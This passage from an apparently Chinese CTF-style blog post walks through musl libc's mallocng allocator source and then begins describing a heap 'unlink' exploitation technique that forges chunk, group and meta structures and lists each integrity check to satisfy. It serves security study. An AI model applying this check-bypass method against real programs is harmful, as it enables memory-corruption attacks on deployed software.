<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">    <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">    <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">    <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">    <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span> &lt;&lt; m-&gt;mem-&gt;active_idx) - <span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> size = size_classes[m-&gt;sizeclass] * UNIT;</span><br><span class="line">            <span class="type">int</span> span = UNIT + size * cnt;</span><br><span class="line">            <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">            <span class="keyword">while</span> ((span ^ (span + size - <span class="number">1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                span += size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx + <span class="number">1</span>)</span><br><span class="line">                cnt = m-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">            m-&gt;mem-&gt;active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    mask = activate_group(m);</span><br><span class="line">    assert(mask);</span><br><span class="line">    decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="enframe"><a href="#enframe" class="headerlink" title="enframe"></a>enframe</h3><p>首先计算出 chunk 的起始和结束地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">size_t</span> slack = (stride - IB - n) / UNIT;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p + stride - IB;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>get_stride</code> 函数是计算出 <code>meta</code> 中 chunk 的大小。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_stride</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;last_idx &amp;&amp; g-&gt;maplen) &#123;</span><br><span class="line">        <span class="keyword">return</span> g-&gt;maplen * <span class="number">4096UL</span> - UNIT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UNIT * size_classes[g-&gt;sizeclass];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了增大利用难度，用户使用的内存区域会在原有 chunk 的位置后加一个随机的偏移 <code>off</code> ，这个随机值是通过 <code>ctr</code>（<code>ctx.mmap_counter</code>）， chunk 的 offset 以及剩余区域大小计算出来的。之后在原有 chunk 的 idx 字段打上 <code>7 &lt;&lt; 5</code> 标记，并且将 <code>p</code> 指针后移 <code>UNIT * off</code> 字节。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line">    <span class="type">size_t</span> m = slack;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    m |= m &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    off &amp;= m;</span><br><span class="line">    <span class="keyword">if</span> (off &gt; slack) off -= slack + <span class="number">1</span>;</span><br><span class="line">    assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line">    <span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line">    <span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = off;</span><br><span class="line">    p[<span class="number">-3</span>] = <span class="number">7</span> &lt;&lt; <span class="number">5</span>;</span><br><span class="line">    p += UNIT * off;</span><br><span class="line">    <span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line">    <span class="comment">// byte, so make one.</span></span><br><span class="line">    p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后如下图所示设置相关字段信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/f685c9b70ab21e3f5373428a76c0b481.png"
                     
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_size</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">unsigned</span> <span class="type">char</span> *end, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> reserved = end - p - n;</span><br><span class="line">    <span class="keyword">if</span> (reserved) end[-reserved] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        *(<span class="type">uint32_t</span> *) (end - <span class="number">4</span>) = reserved;</span><br><span class="line">        end[<span class="number">-5</span>] = <span class="number">0</span>;</span><br><span class="line">        reserved = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) + (reserved &lt;&lt; <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint16_t</span> *) (p - <span class="number">2</span>) = (<span class="type">size_t</span>) (p - g-&gt;mem-&gt;storage) / UNIT;</span><br><span class="line">    p[<span class="number">-3</span>] = idx;</span><br><span class="line">    set_size(p, end, n);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></div>

<h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><p><code>p</code> 为空直接返回，否则获取 <code>chunk</code> 对应的 <code>meta</code> ，<code>index</code> 和 <code>group</code> 中 <code>chunk</code> 的大小，根据这些信息计算出 <code>chunk</code> 的起始和结束位置。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride * idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; idx, all = (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>将 <code>chunk</code> 的 <code>index</code> 和 <code>flag</code> 一并置为 0xFF ，<code>offset</code> 置为 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *) p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *) ((<span class="type">char</span> *) p - <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>如果释放的 <code>chunk</code> 的起始和结束地址差至少 2 个内存页则释放的 <code>chunk</code> 必然包含一个内存页，因此将 <code>chunk</code> 包含的所有完整物理页调用 <code>madvise</code> 设置 <code>lazyfree</code> 标志，这样在内存紧缺的时候会回收这些物理页。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>) (start - <span class="number">1</span>) ^ (<span class="type">uintptr_t</span>) end) &gt;= <span class="number">2</span> * PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>) start &amp; (PGSZ - <span class="number">1</span>));</span><br><span class="line">    <span class="type">size_t</span> len = (end - base) &amp; -PGSZ;</span><br><span class="line">    <span class="keyword">if</span> (len) &#123;</span><br><span class="line">        <span class="type">int</span> e = errno;</span><br><span class="line">        madvise(base, len, MADV_FREE);</span><br><span class="line">        errno = e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果加上将要释放的 <code>chunk</code> 该 <code>group</code> 中的所有 <code>chunk</code> 要么被释放要么空闲则跳出循环，否则更新 <code>freed_mask</code> 并返回。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">    <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">    <span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">    assert(!(mask &amp; self));</span><br><span class="line">    <span class="keyword">if</span> (!freed || mask + self == all) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (!MT)</span><br><span class="line">        g-&gt;freed_mask = freed + self;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed + self) != freed)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果跳出循环则会调用 <code>nontrivial_free</code> 释放 <code>group</code> 并返回需要 <code>munmap</code> 的内存的起始地址和大小，之后调用 <code>munmap</code> 释放这块内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">    <span class="type">int</span> e = errno;</span><br><span class="line">    munmap(mi.base, mi.len);</span><br><span class="line">    errno = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="nontrivial-free"><a href="#nontrivial-free" class="headerlink" title="nontrivial_free"></a>nontrivial_free</h3><p>如果加上将要释放的 <code>chunk</code> 该 <code>group</code> 中的所有 <code>chunk</code> 要么被释放要么空闲并且 <code>group</code> 是可以释放的则首先判断 <code>meta</code> 是否在 active 这个 deque 中，如果在的话会将该 <code>meta</code> 从 deque 中取出。如果取出这个操作改变了 <code>active</code> 指针则将 <code>active</code> 当前指向的 <code>meta</code> 对应的 <code>group</code> 中的 <code>chunk</code> 调用 <code>activate_group</code> 函数激活。之后调用 <code>free_group</code> 将 <code>chunk</code> 所在的 <code>group</code> 释放并返回需要 <code>munmap</code> 的内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span> &lt;&lt; i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask + self == (<span class="number">2u</span> &lt;&lt; g-&gt;last_idx) - <span class="number">1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">    <span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">    <span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="type">int</span> activate_new = (ctx.active[sc] == g);</span><br><span class="line">        dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">        <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">            activate_group(ctx.active[sc]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>如果该 <code>chunk</code> 所在的 <code>meta</code> 既没有释放的 <code>chunk</code> 也没有空闲的 <code>chunk</code> 则将该 <code>meta</code> 加入到 <code>active</code> 中。最后更新 <code>freed_mask</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">    assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">    <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">    <span class="comment">// after last available slot was taken.</span></span><br><span class="line">    <span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">        <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure></div>

<h3 id="free-group"><a href="#free-group" class="headerlink" title="free_group"></a>free_group</h3><p>首先更新 <code>usage_by_class</code> 。如果 <code>group</code> 是 mmap 得到的则返回 <code>group</code> 对应内存，否则调用 <code>nontrivial_free</code> 释放 <code>group</code> 所在的 <code>chunk</code> 。之后将 <code>meta</code> 释放。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        ctx.usage_by_class[sc] -= g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">        step_seq();</span><br><span class="line">        record_seq(sc);</span><br><span class="line">        mi.base = g-&gt;mem;</span><br><span class="line">        mi.len = g-&gt;maplen * <span class="number">4096UL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line">        <span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">        g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">        mi = nontrivial_free(m, idx);</span><br><span class="line">    &#125;</span><br><span class="line">    free_meta(g);</span><br><span class="line">    <span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>group</code> 可以被释放的条件如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">okay_to_free</span><span class="params">(<span class="keyword">struct</span> meta *g)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;freeable) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free individual mmaps not suitable for reuse</span></span><br><span class="line">    <span class="keyword">if</span> (sc &gt;= <span class="number">48</span> || get_stride(g) &lt; UNIT * size_classes[sc])</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// always free groups allocated inside another group&#x27;s slot</span></span><br><span class="line">    <span class="comment">// since recreating them should not be expensive and they</span></span><br><span class="line">    <span class="comment">// might be blocking freeing of a much larger group.</span></span><br><span class="line">    <span class="keyword">if</span> (!g-&gt;maplen) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if there is another non-full group, free this one to</span></span><br><span class="line">    <span class="comment">// consolidate future allocations, reduce fragmentation.</span></span><br><span class="line">    <span class="keyword">if</span> (g-&gt;next != g) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free any group in a size class that&#x27;s not bouncing</span></span><br><span class="line">    <span class="keyword">if</span> (!is_bouncing(sc)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> cnt = g-&gt;last_idx + <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if usage is high enough that a larger count should be</span></span><br><span class="line">    <span class="comment">// used, free the low-count group so a new one will be made.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">9</span> * cnt &lt;= usage &amp;&amp; cnt &lt; <span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// otherwise, keep the last group in a bouncing class.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="堆利用-1"><a href="#堆利用-1" class="headerlink" title="堆利用"></a>堆利用</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>伪造 <code>chunk</code> ，<code>group</code> 和 <code>meta</code> 然后释放伪造的 <code>chunk</code> ，通过合理构造伪造的 <code>meta</code> 中的 <code>prev</code> 和 <code>next</code> 利用 <code>nontrivial_free</code> 中调用的 <code>dequeue</code> 实现 <code>unlink</code> 操作。</p>
<p>根据前面的分析， <code>free</code> 首先会调用 <code>get_meta</code> ，而 <code>get_meta</code> 有如下检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>) p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *) (p - <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *) (p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) (p - UNIT * offset - UNIT);</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">    assert(meta-&gt;mem == base);</span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *) ((<span class="type">uintptr_t</span>) meta &amp; <span class="number">-4096</span>);</span><br><span class="line">    assert(area-&gt;check == ctx.secret);</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass] * index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass] * (index + <span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen * <span class="number">4096UL</span> / UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *) meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>assert(!((uintptr_t) p &amp; 15));</code>，即 <code>chunk</code> 应该关于 0x10 对齐。</li>
<li><code>meta-&gt;mem == base</code> ，即 <code>meta</code> 中保存的 <code>group</code> 指针要正确。</li>
<li><code>index &lt;= meta-&gt;last_idx</code> ，即 <code>chunk</code> 的索引不能越界。</li>
<li><code>assert(!(meta-&gt;avail_mask &amp; (1u &lt;&lt; index)));</code> ，<code>assert(!(meta-&gt;freed_mask &amp; (1u &lt;&lt; index)));</code> ，检测 double free 。</li>
<li><code>area-&gt;check == ctx.secret</code> ，即 <code>meta</code> 所在的 <code>meta_area</code> 的校验值正确。如果伪造的 <code>meta</code> 位于一个伪造的 <code>meta_area</code> 中，需要首先获取校验值 <code>secret</code> 并保存到 <code>meta_area</code> 开头，即这一页最开始的地方。</li>
<li><code>offset &gt;= size_classes[meta-&gt;sizeclass]*index</code> ，<code>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)</code> ，这两个检查 <code>offset</code> 和 <code>chunk</code> 大小是否对应。</li>
<li><code>assert(offset &lt;= meta-&gt;maplen*4096UL/UNIT - 1);</code> ，即检查 <code>offset</code> 是否越界。</li>
</ul>
<p>紧接着还会调用 <code>get_nominal_size</code>，其中有对 <code>chunk</code> 的检查，总结来说 chunk 区域尽量都填 0 。</p>
